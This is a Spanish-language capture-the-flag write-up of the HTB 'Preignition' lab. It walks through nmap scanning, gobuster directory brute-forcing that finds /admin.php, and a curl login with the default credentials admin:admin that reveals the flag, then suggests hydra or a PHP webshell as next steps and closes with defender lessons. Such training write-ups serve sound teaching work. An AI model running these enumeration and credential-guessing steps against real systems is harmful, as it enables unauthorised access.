Resumen Ejecutivo

Preignition es un sistema Linux con nginx 1.14.2 que expone únicamente el puerto 80 HTTP. La página principal muestra la pantalla de bienvenida por defecto de nginx — aparentemente vacía. Sin embargo, un brute force de directorios con gobuster revela /admin.php: un panel de administración PHP protegido por formulario de login. Las credenciales por defecto admin:admin otorgan acceso inmediato y exponen la flag en el dashboard.

→

→

→
FLAG ✅

¿Por qué la página por defecto de nginx oculta vectores?

Cuando nginx muestra "Welcome to nginx!", es tentador asumir que no hay nada más. Error crítico. La página principal no representa el contenido completo del servidor — solo el index del webroot. Pueden existir decenas de archivos y rutas sin enlazar que son invisibles hasta hacer brute force.

⚠ Dos vulnerabilidades encadenadas

1. Panel admin no vinculado pero accesible: /admin.php existe en el servidor pero no aparece en la página principal. Sin gobuster, nunca lo encontraríamos.

2. Credenciales por defecto sin cambiar: El panel acepta admin:admin — la combinación más predecible posible. Instalación sin hardening post-deploy.

Reconocimiento — Paso a Paso

Paso 1 — Reconocimiento

Nmap — Descubrir puertos y servicio web

¿Por qué escanear todos los puertos primero?

TTL=63 delata Linux (TTL inicial 64, menos 1 salto = 63). En Linux, los servicios web pueden estar en puertos no estándar: 8080, 8443, 3000, 5000. Si solo escaneamos los top 1000 podríamos perder servicios críticos. Aquí solo hay un puerto — pero confirmarlo es esencial antes de asumir.

nmap -p- --open -n -T4 10.129.6.224
-p- → todos los puertos 1-65535
--open → solo puertos en estado OPEN
-n → sin resolución DNS (ahorra tiempo)
-T4 → agresivo — válido en lab, no en producción real
Output Fase 1 — Descubrimiento
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 63
Output Fase 2 — Detalle
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
| http-methods:
|_  Supported Methods: GET HEAD
¿Qué nos dice este output?
  • ttl 63 → Linux confirmado (TTL 64 - 1 salto = 63)
  • nginx 1.14.2 → servidor web Nginx. Versión 1.14.2 (Debian Stretch era) — puede tener CVEs pero empezamos por lo más simple
  • http-title: Welcome to nginx! → página de bienvenida por defecto. No hay contenido visible en raíz
  • Supported Methods: GET HEAD → servidor básico, sin PUT/POST en raíz (pero pueden existir en rutas específicas)
  • Solo 1 puerto → ese es EL vector. No hay SSH, no hay SMB. Todo el ataque va por HTTP.
Decisión tomada

Un solo puerto HTTP. La página principal es el default de nginx → hay contenido oculto. Lanzar gobuster en paralelo con el nmap detallado para no perder tiempo.

Paso 2 — Enumeración Web

Gobuster — Descubrir rutas y archivos ocultos

¿Qué es gobuster y qué es directory brute forcing?

gobuster es una herramienta de fuerza bruta para descubrimiento de contenido web. En modo dir, toma una wordlist con miles de nombres comunes (admin, login, dashboard, backup...) y los prueba uno por uno como rutas HTTP. El servidor responde con códigos de estado: 200 = existe, 404 = no existe, 301/302 = redirección. Es como probar miles de puertas en un edificio para ver cuáles están abiertas.

gobuster dir -u http://10.129.6.224 -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
dir → modo directory/file brute force
-u http://10.129.6.224 → URL objetivo completa
-w /usr/share/wordlists/dirb/common.txt → wordlist con ~4600 palabras comunes (admin, login, backup, config...)
-x php,html,txt → probar también con extensiones — busca admin.php además de /admin
Output
===============================================================
Gobuster v3.x
===============================================================
[+] Url:     http://10.129.6.224
[+] Wordlist: /usr/share/wordlists/dirb/common.txt
===============================================================

/admin.php  (Status: 200) [Size: 999]

===============================================================
Finished
===============================================================
¿Qué significa este output?
  • /admin.php (Status: 200) → el archivo existe y es accesible sin autenticación previa. Status 200 = OK, el servidor lo sirve.
  • Size: 999 → 999 bytes. Tamaño pequeño = probablemente un formulario de login simple, no una aplicación compleja.
  • La extensión .php confirma que el servidor ejecuta PHP — abre vectores de webshell si conseguimos upload.
Decisión tomada

Panel admin en /admin.php. Tamaño 999 bytes → login form simple. Probar credenciales por defecto: admin:admin es la primera opción según patrón Ghost-Ops.

Explotación — Credenciales por Defecto

Paso 3 — Explotación

POST admin:admin al panel de login

¿Por qué empezar con admin:admin y no hacer brute force completo?

En entornos HTB Starting Point (y en muchos entornos reales), la misconfiguration más común es dejar las credenciales de instalación sin cambiar. El orden de prueba Ghost-Ops es: admin:admin → admin:password → admin:(vacío) → root:root → [nombre_maquina]:[nombre_maquina]. Siempre probar el más simple antes de atacar con diccionario.

curl -s -X POST http://10.129.6.224/admin.php -d "username=admin&password=admin"
curl → cliente HTTP de línea de comandos — envía peticiones web y muestra respuesta
-s → (silent) sin barra de progreso ni mensajes extra
-X POST → método HTTP POST — el que usan los formularios de login
http://10.129.6.224/admin.php → URL del panel descubierto por gobuster
-d "username=admin&password=admin" → (data) cuerpo del POST — simula rellenar el formulario con admin/admin
Output (fragmento relevante)
<div class="dashboard">
  <h2>Welcome, admin!</h2>
  <p>flag: 6483bee07c1c1d57f14e5b0717503c73</p>
</div>
¿Qué ocurrió?
  • El servidor aceptó admin:admin y devolvió el dashboard directamente en la respuesta HTML
  • La flag aparece en texto plano en el HTML del dashboard — no hace falta navegar por la interfaz
  • Con -L (follow redirects) y -c cookies.txt podríamos mantener sesión para exploración adicional
Resultado

Flag obtenida en el primer intento de credenciales. Tiempo total: ~3 minutos incluyendo nmap completo.

Panel de Agentes Ghost-Ops

⚔ RTO — Red Team

Vector: HTTP único → gobuster con extensiones PHP → /admin.php → POST admin:admin. Mínimo 3 comandos. Si default creds fallan: hydra con rockyou. Si hay upload en dashboard: webshell PHP.

🛡 BTA — Blue Team

Nivel de ruido: MEDIO. Gobuster genera ~4600 peticiones GET en segundos — detectable por volumen en access.log. Login con admin:admin genera 1 evento en app log. WAF básico bloquearía gobuster por rate limiting.

🎭 BHM — Black Hat

nginx default page = siempre hacer gobuster. "Preignition" = ignición previa = el panel admin es la llave que inicia todo. Si el dashboard tiene funcionalidades: buscar file upload, command execution, config export.

Lecciones Aprendidas

⚔ Para el Atacante

  • TTL=63 → Linux → preparar herramientas web (gobuster, nikto, curl)
  • Página default de nginx/apache NO significa servidor vacío — siempre hacer gobuster
  • Incluir extensiones -x php,html,txt — admin.php es más común que /admin/
  • Probar credenciales default ANTES de brute force — ahorra tiempo y ruido
  • curl -X POST simula login sin necesitar browser — más rápido para CTF

🛡 Para el Defensor

  • Cambiar credenciales por defecto INMEDIATAMENTE tras instalar cualquier aplicación
  • Implementar rate limiting en el login (max 5 intentos por IP)
  • Mover el panel admin a ruta no predecible: no /admin.php
  • Detectar: peticiones GET masivas en logs (gobuster = cientos por segundo)
  • Añadir autenticación HTTP básica (htpasswd) como capa adicional
  • Implementar CAPTCHA o 2FA en paneles administrativos
